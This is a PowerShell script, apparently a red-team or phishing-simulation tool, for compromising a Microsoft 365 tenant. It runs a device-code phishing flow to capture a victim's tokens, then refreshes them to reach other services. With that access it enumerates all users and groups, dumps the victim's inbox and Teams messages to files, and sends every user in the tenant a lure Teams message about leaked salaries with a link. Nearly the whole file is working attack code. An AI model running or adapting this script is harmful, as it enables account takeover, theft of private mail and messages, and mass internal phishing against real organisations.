[CmdletBinding()]
param (
    [Parameter(ValueFromPipeline=$true)]
    [string]$teamsUser,
    [Parameter(ValueFromPipeline=$true)]
    [string]$teamsMessage,
    [Parameter(ValueFromPipelineByPropertyName=$true)]
    [string]$Token
)

# if (-not (Get-Module -Name AADInternals -ListAvailable)) { Write-Output "Importing AADInternals";
#     Import-Module AADInternals
# }

# V2 does not contain -CaptureCode $Token for some reason...
# if (-not (Get-Module -Name TokenTactics -ListAvailable)) { Write-Output "TokenTactics not found, importing V2 fork from project folder";
#     Import-Module .\TokenTacticsV2\TokenTactics.psd1
# }

# TokenTactics latest zip
# https://github.com/rvrsh3ll/TokenTactics/archive/refs/heads/main.zip
# if (-not (Get-Module -Name TokenTactics -ListAvailable)) { Write-Output "TokenTactics not found, importing V1 from project folder";
#     Import-Module .\TokenTactics\TokenTactics.psd1
# }

# Azure hound bins
# https://github.com/BloodHoundAD/AzureHound/releases/download/v2.0.4/azurehound-windows-amd64.zip
# https://github.com/BloodHoundAD/AzureHound/releases/download/v2.0.4/azurehound-linux-amd64.zip

# ROADtools
# pip install roadlib/
# pip install roadrecon/
# pip install roadtx/


# if(!($domain)){ Write-Output "Please specify target domain"; $domain = Read-Host; Write-Output "$domain selected" }
# if(!($user)){ Write-Output "Please specify target user"; $user = Read-Host; Write-Output "$user selected" } 

Get-AzureToken -Client Graph

# V1: If you already have your token from a capture server defined as $Token
# Get-AzureToken -Client Graph -CaptureCode $Token 

if(!($response)){ Read-Host "User didn't bite, try again."} else {
$access = $response.access_token
$refresh = $response.refresh_token
Add-AADIntAccessTokenToCache -AccessToken $access -RefreshToken $refresh

$acc = Read-AADIntAccessToken $access
$user = $acc.upn
$domain = $user.Split("@")[1]
Write-Output "$user took the bait."

# recon
# Connect-AzureAD -AadAccessToken $response.access_token -AccountId $user
$tok = $response.refresh_token
.\azurehound\azurehound.exe -r $tok list --tenant $domain -o .\azurehound.json 

# # RoadRecon
# RefreshTo-MSGraphToken -refreshtoken  $response.refresh_token -domain $domain -Device iPhone -Browser Safari
# roadrecon auth --access-token $response.access_token
# roadrecon $gather
# roadrecon plugin policies 

# AAdInternals recon
$core=RefreshTo-AzureCoreManagementToken -domain $domain
Add-AADIntAccessTokenToCache -AccessToken $core.access_token -RefreshToken $core.refresh_token 
# $results = Invoke-AADIntReconAsInsider
# $jsonContent = $results | ConvertTo-Json
# $jsonContent | Out-File -FilePath "intrecon.json"

# users and groups
$userEnum = Invoke-AADIntUserEnumerationAsInsider
$jsonContent = $userEnum | ConvertTo-Json
$jsonContent | Out-File -FilePath "userEnum.json"

# AzAD Group memberships
Connect-AzureAD -AadAccessToken $response.access_token -AccountId $user

# Users
# Retrieve all users
$users = Get-AzureADUser -All $true
$jsonContent = $users | ConvertTo-Json
$jsonContent | Out-File -FilePath "users.json"

# Retrieve all groups
$groups = Get-AzureADGroup -All $true
$jsonContent = $groups | ConvertTo-Json
$jsonContent | Out-File -FilePath "groups.json"

# Create an empty array to store group and member information
$groupData = @()

# Iterate over each group and retrieve its members
foreach ($group in $groups) {
    $groupInfo = [ordered]@{
        GroupName = $group.DisplayName
        Members = @()
    }

    # Retrieve members of the group
    $members = Get-AzureADGroupMember -ObjectId $group.ObjectId -All $true

    # Add members to group info
    foreach ($member in $members) {
        $groupInfo.Members += $member.DisplayName
    }

    # Add group info to the array
    $groupData += $groupInfo
}
# Convert the group data to JSON
$jsonData = $groupData | ConvertTo-Json
$jsonData | Out-File -FilePath "members.json"

# Requires V2: Attempt CAE token
# RefreshTo-MSGraphToken -UseCAE -Domain $domain
# if ( $global:MSGraphTokenValidForHours -gt 23) { "MSGraph token is CAE capable, token is good for 24 hours. For more information: https://learn.microsoft.com/en-us/azure/active-directory/conditional-access/concept-continuous-access-evaluation " }

# Email
# dump emails via graph with tokentactics
$outlook=RefreshTo-OutlookToken -domain $domain -refreshToken $response.refresh_token
Add-AADIntAccessTokenToCache -AccessToken $outlook.access_token -RefreshToken $outlook.refresh_token

$OutlookToken.refresh_token
$OutlookToken.access_token

# Refresh to Graph, Dump emails
RefreshTo-MSGraphToken -refreshtoken  $response.refresh_token -domain $domain -Device iPhone -Browser Safari
$emails = Dump-OWAMailboxViaMSGraphApi -AccessToken $MSGraphToken.access_token -mailFolder inbox -Device iPhone -Browser Safari 
# Convert the emails to JSON
$jsonData = $emails | ConvertTo-Json
$jsonData | Out-File -FilePath "$user.emails.json"

# Get Teams Token and export for AADInternals
$teams=RefreshTo-MSTeamsToken -refreshToken $response.refresh_token -domain $domain
Add-AADIntAccessTokenToCache -AccessToken $teams.access_token -RefreshToken $teams.refresh_token

# Export TeamsMessages
$msgs = Get-AADIntTeamsMessages -AccessToken $MSTeamsToken.access_token | Format-Table id,content,deletiontime,*type*,DisplayName 
# Convert the emails to JSON
$jsonData = $msgs | ConvertTo-Json
$jsonData | Out-File -FilePath "$user.teams.json"

# Send payload link to all users in tenant
# Example message content
$messageContent = "Hey! Someone left the list of upcoming terminations and their salaries on the K drive, you won't believe this <a href='https://decoy.com/contractors'>Decoy Contractors</a>."

# Example Teams message information
$teamsMessage = @{
    Body = @{
        ContentType = "html"
        Content = $messageContent
    }
}

# Delay between retries (in seconds)
$retryDelay = 5

# Send Teams message to each user with a retry mechanism
foreach ($user in $users) {
    $teamsUser = $user.UserPrincipalName 
    
    $retryCount = 0
    $maxRetries = 3
    
    do {
        try {
            Send-AADIntTeamsMessage -Recipients $teamsUser -Message $teamsMessage
            break  # If successful, exit the retry loop
        } catch {
            Write-Host "Error sending message to $teamsUser. Retrying in $retryDelay seconds..."
            Start-Sleep -Seconds $retryDelay
            $retryCount++
        }
    } while ($retryCount -lt $maxRetries)
}

# Open Mailboxz in browser with Burp, paste into repeater
RefreshTo-SubstrateToken -refreshToken $response.refresh_token -domain $domain -Device AndroidMobile -Browser Android
Open-OWAMailboxInBrowser -AccessToken $SubstrateToken.access_token -Device Mac -Browser Edge

}

# One Drive PoC
# Create a new OneDriveSettings object
# Get-WmiObject -Class Win32_NTDomain | select DomainName,DomainGuid
# $os = New-AADIntOneDriveSettings
# Get-AADIntOneDriveFiles -OneDriveSettings $os | Format-Table
# Get-AADIntOneDriveFiles -OneDriveSettings $os -DomainGuid "667965e7-de8e-440d-adc3-371a35474a41" | Format-Table

# Set-AADIntTeamsStatusMessage -Message "My cool status message" -AccessToken $MSTeamsToken.access_token -Verbose
# if(!(teamsMessage)){ $teamsMessage = "$user has taken the bait in a phishing simulation. This message is to simulate an attacker taking control of the account. Please follow up with your IT security team."}
# if($teamsUser) { Send-AADIntTeamsMessage -Recipients $teamsUser -Message $teamsMessage } else { Write-Output "Skipping the Teams message."}

